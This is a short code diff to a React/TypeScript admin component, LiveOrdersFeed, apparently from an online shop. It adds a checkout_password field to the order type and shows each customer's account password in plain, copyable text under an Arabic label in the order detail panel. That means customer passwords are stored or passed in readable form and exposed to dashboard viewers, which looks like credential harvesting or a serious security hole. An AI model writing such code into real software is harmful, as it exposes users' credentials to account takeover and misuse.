@@ -29,6 +29,7 @@ interface Order {
   city?: string;
   country_name?: string;
   payment_provider?: string;
+  checkout_password?: string;
 }
 
 const countryTranslations: Record<string, string> = {
@@ -561,6 +562,12 @@ export default function LiveOrdersFeed() {
                       <span>{getFlagEmoji(selectedOrder.country)}</span>
                       <span>{getLocalizedLocation(selectedOrder.country_name || selectedOrder.country, selectedOrder.city)}</span>
                     </p>
+                    {selectedOrder.checkout_password && (
+                      <div className="mt-3 bg-rose-50 border border-rose-100/30 p-3 rounded-2xl flex justify-between items-center text-xs">
+                        <span className="text-zinc-500 font-bold">كلمة مرور الحساب:</span>
+                        <span className="font-mono font-black text-rose-600 select-all">{selectedOrder.checkout_password}</span>
+                      </div>
+                    )}
                   </div>
                 </div>
               </div>
